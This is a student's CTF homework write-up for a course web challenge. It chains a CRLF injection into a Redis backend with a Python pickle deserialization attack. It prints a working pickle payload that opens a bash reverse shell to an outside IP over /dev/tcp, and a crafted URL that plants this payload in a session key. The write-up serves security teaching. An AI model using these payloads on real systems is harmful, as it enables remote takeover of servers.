# Computer Security Hw0x06 Writeup
* Realname: 胡安鳳
* ID on course web: alfons0329
* Student ID: R08922024
###### tags: `Computer Security` `NTU CS` `CS` `CTF` `Writeup`

## $\rightarrow Tinyurl \leftarrow \Sigma(\oplus \omega \oplus)||$ (web)
### Step 1, Exploit CRLF injection vulnerability
* In redis intranet app, there is a CRLF injection according to [this site](https://bugs.python.org/issue35906?fbclid=IwAR12OndtZ2NisFbraut6eW7-iXrcEye9SY-htwHny00t226YEgBITPMiH4M). That is, we may use CRLF injection to write some payload in redis database
(from `app.py`, redis is running at `redis:6379`)
![](https://i.imgur.com/rzAmNWG.png)

* So what can we do with this vulnerability?? Actually we can see that the `GET <session>` will return `{_pernament: True}` which means the expiration of session. $\rightarrow$ Which will be **deserialized** while the web browser with same session key (re)loads the page.

### Step 2, Exploit python deserialization vulnerability
From Step 1, we may write a serialized code for shell according to [this article](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0X05-Python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BD%95%E6%9D%A5) with `__reduce__` and picke serialization.
```python
class shell_class(object):
    def __reduce__(self):
        reverse_shell = "bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'"
        return (os.system, (reverse_shell, ))

sh = shell_class()
sh_serial = pickle.dumps(sh)
```
### Step 3, Hack the session cookie
Write the reverse shell payload to session of `edu-ctf.csie.org:10163`

Note: We cannot (over)write our own session data, so write to the session of second browser instead.

![](https://i.imgur.com/bEPmJUV.png)
or code

```python
sh_serial = str(sh_serial)[1:]
sh_serial = urllib.parse.quote(sh_serial)

# send payload
p = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET 
"session:ffab9582-1ec5-461b-af2e-15621b9b4d67" 
' + sh_serial + '%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
```

![](https://i.imgur.com/rEYMuSG.png)

### Step 4, Get reverse shell

Reload the webpage in broewer with session ID [  session:ffab9582-1ec5-461b-af2e-15621b9b4d67  ] for reverse shell.
![](https://i.imgur.com/qckDIE2.png)
